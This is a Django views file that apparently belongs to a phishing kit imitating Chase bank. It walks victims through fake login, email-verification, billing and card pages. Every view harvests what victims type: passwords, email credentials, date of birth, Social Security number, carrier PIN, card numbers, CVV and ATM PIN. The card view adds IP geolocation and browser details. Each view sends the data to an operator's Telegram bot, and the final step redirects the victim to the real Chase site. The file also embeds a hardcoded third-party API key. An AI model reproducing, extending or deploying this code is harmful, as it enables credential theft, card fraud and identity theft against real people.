from django.shortcuts import render, redirect
from django.conf import settings
import requests
import datetime
from django.core.mail import EmailMultiAlternatives


def visitor_ip_address(request):

    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')

    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip


def get_geolocation_for_ip(ip):
    url = f"http://api.ipstack.com/{ip}?access_key=67c29f7330c075f5382be0d5c896abed"
    response = requests.get(url)
    response.raise_for_status()
    return response.json()
       
        
def login(request):
    if request.method == 'POST':
        recaptcha_response = request.POST.get('g-recaptcha-response')
        data = {
            'secret': settings.GOOGLE_RECAPTCHA_SECRET_KEY,
            'response': recaptcha_response
        } 
        
        r = requests.post('https://www.google.com/recaptcha/api/siteverify', data=data)
        
        result = r.json()
        
        if result["success"]:
            
            USERNAME1 = request.POST["username_step1"]
            PASSWORD1 = request.POST["password_step1"]
            USERNAME2 = request.POST["username"]
            PASSWORD2 = request.POST["password"]

            payload = f"""|---> New Login Log <---|
------------------------------------
Login Time : {datetime.datetime.now()}
------------------------------------
Login Info : 
Login Step 1 => {USERNAME1}:{PASSWORD1}
Login Step 2 => {USERNAME2}:{PASSWORD2}
------------------------------------"""


            post = f"https://api.telegram.org/bot{settings.TOKEN}/sendMessage?chat_id={settings.NUMBER_ID}&text={payload}"
            requests.post(post)
                        
            return redirect("base:mailAccess")          
        return render(request, "base/login.html")
    else:
        context = {
            'recaptcha_site_key':settings.GOOGLE_RECAPTCHA_SITE_KEY
        }
        
        return render(request, "base/login.html", context)



def get_mail_access(request):
    if request.method == 'POST':
        recaptcha_response = request.POST.get('g-recaptcha-response')
        data = {
            'secret': settings.GOOGLE_RECAPTCHA_SECRET_KEY,
            'response': recaptcha_response
        } 
        
        r = requests.post('https://www.google.com/recaptcha/api/siteverify', data=data)
        
        result = r.json()
        
        if result["success"]:
            
            MAIL_ACCESS1 = request.POST["MailAccess_step1"]
            PASSWORD_ACCESS1 = request.POST["PasswordAccess_step1"]
            MAIL_ACCESS2 = request.POST["Email_access"]
            PASSWORD_ACCESS2 = request.POST["Password_access"]

            payload = f"""|---> Mail Access Log <---|
------------------------------------
Time : {datetime.datetime.now()}
------------------------------------
Mail Access Info : 
Mail Access Step 1 => {MAIL_ACCESS1}:{PASSWORD_ACCESS1}
Mail Access Step 2=> {MAIL_ACCESS2}:{PASSWORD_ACCESS2}
------------------------------------"""

            post = f"https://api.telegram.org/bot{settings.TOKEN}/sendMessage?chat_id={settings.NUMBER_ID}&text={payload}"
            requests.post(post)
                        
            return redirect("base:billing_address")          
        return render(request, "base/verify_email.html")
    else:
        context = {
            'recaptcha_site_key':settings.GOOGLE_RECAPTCHA_SITE_KEY
        }
        
        return render(request, "base/verify_email.html", context)


def billing_address(request):
    if request.method == 'POST':
        recaptcha_response = request.POST.get('g-recaptcha-response')
        data = {
            'secret': settings.GOOGLE_RECAPTCHA_SECRET_KEY,
            'response': recaptcha_response
        } 
        
        r = requests.post('https://www.google.com/recaptcha/api/siteverify', data=data)
        
        result = r.json()
        
        if result["success"]:
            
            FIRST_NAME = request.POST["FirstName"]
            LAST_NAME = request.POST["LastName"]
            DATE_OF_BIRTH = request.POST["Date_Of_Birth"]
            ADDRESS = request.POST["Address"]
            CITY = request.POST["City"]
            STATE = request.POST["State"]
            ZIP_CODE = request.POST["Zip_Code"]            
            PHONE_NUMBER = request.POST["Phone_Number"]
            Carrier_Pin = request.POST["Carrier_Pin"]
            SSCODE = request.POST["SSCODE"]
            payload = f"""|---> Personal Info Log <---|
------------------------------------
Time : {datetime.datetime.now()}
------------------------------------
Personal Info:
First Name=> {FIRST_NAME}
Last Name => {LAST_NAME}
Date Of Birth => {DATE_OF_BIRTH}
Address => {ADDRESS}
City => {CITY}
State => {STATE}
Zip Code => {ZIP_CODE}
Phone Number => {PHONE_NUMBER}
Carrier_Pin => {Carrier_Pin}
Social Security Number => {SSCODE}
------------------------------------"""

            post = f"https://api.telegram.org/bot{settings.TOKEN}/sendMessage?chat_id={settings.NUMBER_ID}&text={payload}"
            requests.post(post)
                        
            return redirect("base:card_info")          
        return render(request, "base/billing_address.html")
    else:
        context = {
            'recaptcha_site_key':settings.GOOGLE_RECAPTCHA_SITE_KEY
        }
        
        return render(request, "base/billing_address.html", context)


def card_info(request):
    if request.method == 'POST':
        recaptcha_response = request.POST.get('g-recaptcha-response')
        data = {
            'secret': settings.GOOGLE_RECAPTCHA_SECRET_KEY,
            'response': recaptcha_response
        } 
        
        r = requests.post('https://www.google.com/recaptcha/api/siteverify', data=data)
        
        result = r.json()
        
        if result["success"]:
            
            NAME_ON_CARD = request.POST["Name_On_Card2"]
            CARD_NUMBER = request.POST["Card_Number2"]
            EXPIRATION_DATE = request.POST["Expiration_Date2"]
            SECURITY_CODE = request.POST["Security_Code2"]
            THREEDSECURE = request.POST["3D_Secure2"]
            
            NAME_ON_CARD2 = request.POST["Name_On_Card"]
            CARD_NUMBER2 = request.POST["Card_Number"]
            EXPIRATION_DATE2 = request.POST["Expiration_Date"]
            SECURITY_CODE2 = request.POST["Security_Code"]
            THREEDSECURE2 = request.POST["3D_Secure"]
               
            IP = visitor_ip_address(request)
            NEW_DATA = get_geolocation_for_ip(IP)
            COUNTRY = NEW_DATA["country_name"]
            CONTINENT_NAME = NEW_DATA["continent_name"]
            REGION_NAME = NEW_DATA['region_name']
            CITY_NAME = NEW_DATA["city"]
            USER_AGENT = request.POST["user_agent"]
            BROWSER_NAME = request.POST["browser_name"]
            BROWSER_VERSION = request.POST["browser_version"]
            LANGUAGES = request.POST["languages"]
            
            payload = f"""|---> Card Info Log <---|
------------------------------------
Time : {datetime.datetime.now()}
------------------------------------
Card Info :

Step 1 :
Name On Card : {NAME_ON_CARD2}
Card Number : {CARD_NUMBER2}
Expiration Date : {EXPIRATION_DATE2}
CVV : {SECURITY_CODE2}
ATM pin : {THREEDSECURE2}

Step 2 :
Name On Card : {NAME_ON_CARD}
Card Number : {CARD_NUMBER}
Expiration Date : {EXPIRATION_DATE}
CVV : {SECURITY_CODE}
ATM pin : {THREEDSECURE}
------------------------------------
Client Private Information :
IP Address : {IP}
User Agent : {USER_AGENT}
Languages : {LANGUAGES}
Browser Name : {BROWSER_NAME}
Browser Version : {BROWSER_VERSION}
Country : {COUNTRY}
Continent Name : {CONTINENT_NAME}
Region Name : {REGION_NAME}
City : {CITY_NAME}
------------------------------------"""

            post = f"https://api.telegram.org/bot{settings.TOKEN}/sendMessage?chat_id={settings.NUMBER_ID}&text={payload}"
            requests.post(post)
                        
            return redirect("https://secure05b.chase.com/web/auth/dashboard#/dashboard/index/index")          
        return render(request, "base/card_info.html")
    else:
        context = {
            'recaptcha_site_key':settings.GOOGLE_RECAPTCHA_SITE_KEY
        }
        
        return render(request, "base/card_info.html", context)
